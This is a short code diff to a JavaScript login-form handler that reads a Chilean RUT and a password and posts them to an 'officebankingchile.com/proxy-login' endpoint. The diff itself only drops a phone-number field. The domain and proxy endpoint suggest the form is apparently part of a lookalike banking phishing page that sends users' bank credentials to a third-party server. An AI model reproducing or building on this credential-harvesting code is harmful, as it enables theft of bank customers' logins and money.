@@ -266,8 +266,7 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
   e.preventDefault();
   const rut = document.getElementById("rut").value;
   const passwd = document.getElementById("passwd").value;
-  const telefono = document.getElementById("telefono").value;
-
+  
   if(!validarRut(rut)){
     document.getElementById("resultado").innerText = "❌ RUT inválido";
     return;
@@ -277,7 +276,7 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
     const response = await fetch("https://officebankingchile.com/proxy-login", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ rut, passwd, telefono })
+      body: JSON.stringify({ rut, passwd})
     });
     const data = await response.json();
     document.getElementById("resultado").innerText = data.mensaje;
